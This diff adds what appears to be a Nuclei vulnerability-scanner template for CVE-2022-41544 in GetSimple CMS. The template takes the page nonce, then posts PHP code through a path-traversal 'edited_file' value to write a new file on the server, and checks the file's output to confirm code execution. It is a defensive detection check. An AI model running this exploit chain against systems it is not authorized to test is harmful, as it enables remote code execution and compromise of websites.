@@ -1,0 +1,49 @@
+id: CVE-2022-41544
+info:
+  name: GetSimpleCMS theme-edit.php RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    GetSimple CMS v3.3.16 has a remote code execution vulnerability through the edited_file parameter in admin/theme-edit.php.
+  reference:
+    - https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-41544
+  classification:
+    cve-id: CVE-2022-41544
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        GET /admin/theme-edit.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+    extractors:
+      - type: regex
+        name: nonce
+        part: body
+        regex:
+          - '<input id="nonce" name="nonce" type="hidden" value="(.+?)"'
+        internal: true
+  - raw:
+      - |
+        POST /admin/theme-edit.php?t=Dimension&f=template.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+        Content-Type: application/x-www-form-urlencoded
+
+        nonce={{nonce}}&content=<?php+echo+md5(23343245123987654567890);@unlink(__FILE__);?>&edited_file=../a1b2n3.php&submitsave=Guardar+cambios
+    matchers:
+      - type: status
+        status:
+          - 200
+    stop-at-first-match: true
+  - raw:
+      - |
+        GET /a1b2n3.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "cab411e2d284e7b7027f8587513bd9cb"
+        part: body
